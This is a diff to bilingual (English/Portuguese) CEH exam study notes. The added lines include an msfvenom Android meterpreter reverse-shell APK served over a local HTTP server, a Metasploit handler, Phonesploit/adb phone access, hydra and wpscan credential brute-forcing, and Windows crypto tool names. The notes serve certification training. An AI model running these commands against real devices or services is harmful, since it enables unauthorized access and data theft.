@@ -55,6 +55,7 @@ Then go to Desktop and in Ceh tools folder you will find wordlists, here you wil
 Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
 
 hydra -l user -P passlist.txt ftp://10.10.10.10
+Pra SMB pode ser tbm ou usar o Metasploit (auxiliary/scanner/smb/smb_login)
 
 wpscan --url http://wpscan.thm/ --enumerate t,p,u
 wpscan --url http://seila.playground --usernames admin --passwords /usr/share/wordlists/rockyou.txt
@@ -147,6 +148,27 @@ Theef ... Server 'e a vitima e Client o atacante
 2- adb connect IP:5555    (Connect adb with parrot)
 3- adb shell              (Access mobile device on parrot)
 4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
+
+Phonesploit
+nmap -sS -p- -Pn 192.168.20.132 ---> Procurar portas 5555(servico freeciv)
+
+python phonesploit.py
+cd sdcard
+
+tab 01
+msfvenom -l payloads | grep android
+msfvenom -p android/meterpreter/reverse_tcp LHOST=LocalhostIP LPORT=LocalPOrt -f raw > android_shell.apk
+python3 -m http.server
+tab 02
+msfconsole explit(multi/handler) > set LHOST 192.168.20.131
+use exploit/multi/handler
+options
+run
+
+ADB
+cd PhoneSploit
+python3 phonesploit.py
+
 ```
 # Wireshark
 ```
@@ -191,4 +213,19 @@ Step 2 - Aircrack-ng Brute FOrce Dictionary
 ```
 Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
 Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
+
+cryptoforge (Windows... pode encriptar arquivos(botao direito do mouse) ou usar o cryptoforge text pra encriptar textos)
+
+BCTextEncoder (windows) - mesma coisa do cryptoforge... encripta dados (texto)
+
+Hashcalc(windows) - calcula hash de todo tipo
+https://md5calculator.com - site pra md5
+HashMyFiles (windows)
+
+Criptoanalises com CrypTool(windows) - mesma coisa
+
+
+
+
+
 ```
